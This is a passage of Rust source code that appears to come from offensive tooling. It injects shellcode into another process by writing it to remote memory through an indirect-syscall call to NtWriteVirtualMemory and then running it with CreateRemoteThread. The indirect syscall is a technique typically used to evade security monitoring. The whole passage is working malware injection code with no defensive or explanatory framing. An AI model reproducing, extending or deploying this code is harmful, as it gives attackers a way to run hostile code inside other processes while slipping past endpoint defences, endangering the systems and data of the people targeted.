    if alloc_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote alloc failed"); }

    // 2. Write shellcode via indirect syscall.
    let mut written: usize = 0;
    let write_status = unsafe {
        crate::syscalls::nt_write_virtual_memory(
            rt, h_proc as usize, remote_base,
            shellcode.as_ptr(), shellcode.len(),
            &mut written,
        )
    };
    if write_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote write failed"); }

    // 3. CreateRemoteThread on the shellcode address.
    let h_thread = unsafe {
        crt(h_proc, core::ptr::null_mut(), 0, None, remote_base as *mut c_void, 0, core::ptr::null_mut())
    };
    if h_thread.is_null() {
        unsafe { ch(h_proc) };
        return Err("CreateRemoteThread failed");
    }

    unsafe { ch(h_thread) };
    unsafe { ch(h_proc) };
    Ok(())
}
